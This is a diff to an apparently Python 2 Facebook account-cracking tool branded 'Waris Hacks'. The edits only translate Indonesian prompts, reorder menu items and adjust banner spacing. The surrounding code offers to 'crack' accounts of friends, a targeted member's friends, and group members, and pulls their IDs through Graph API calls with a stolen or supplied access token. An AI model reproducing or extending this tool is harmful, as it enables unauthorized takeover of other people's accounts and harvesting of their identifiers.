@@ -57,7 +57,7 @@ logo = """\033[1;93m█████████
 \033[1;93m╔════════════════════════════════════════════════════╗
 \033[1;93m║\033[1;96m* \033[1;93mSupporter  \033[1;93m : \033[1;93mGazarDevelopers\033[1;93m          
 \033[1;93m║\033[1;96m* \033[1;93mAuthor     \033[1;93m : \033[1;93m\033[4mhttps://www.facebook.com/gazardevelopers\033[0m \033[1;93m
-\033[1;93m║\033[1;96m*  \033[1;93mWhatsApp   \033[1;93m: \033[1;93m+1(281)241-7200\033[1;93m                 
+\033[1;93m║\033[1;96m* \033[1;93mWhatsApp    \033[1;93m: \033[1;93m+1(281)241-7200\033[1;93m                 
 \033[1;93m╚════════════════════════════════════════════════════╝"""
 
 def tik():
@@ -79,7 +79,7 @@ os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;96m [¤] \x1b[1;93mAsslam-o-Alikum\x1b[1;96m  \033[1;96m   [¤] \x1b[1;93mWHATSAPP : +1(281)241-7200\x1b[1;96m  
 \033[1;96m [¤] \x1b[1;93mWaris Hacks\x1b[1;96m         [¤] \x1b[1;93mFACEBOOK : GazarDevelopers\x1b[1;96m  
-\033[1;96m [¤] \x1b[1;93mTool-warishacks   \x1b[1;96m  [¤] \x1b[1;93mTALK  : PRIVATE-hacks\x1b[1;96m"""
+\033[1;96m [¤] \x1b[1;93mTool-warishacks   \x1b[1;96m  [¤] \x1b[1;93mTALK     : PRIVATE-hacks\x1b[1;96m"""
 print " \x1b[1;93m============================================================="
 print"This Tool is Professionaly created by waris ali "
 print"if you do not have  login details please contact with gazar developers.Thanks"
@@ -229,8 +229,8 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack targeted member friend  list"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack my own friends list accounts"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack my own friends list accounts"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack targeted member friend  list"
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m crack groups members accounts"
 	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m crack Idz that in file"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m BAck"
@@ -245,7 +245,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mScanning IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -254,7 +254,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+		idt = raw_input("\033[1;96m[+] \033[1;93mEnter Targated member id \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -263,7 +263,7 @@ def pilih_super():
 			print"\033[1;96m[!] \x1b[1;91mFriends not found!"
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mTaken IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -272,7 +272,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
+		idg=raw_input('\033[1;96m[+] \033[1;93mEnter Targated group ID \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
 			asw=json.loads(r.text)
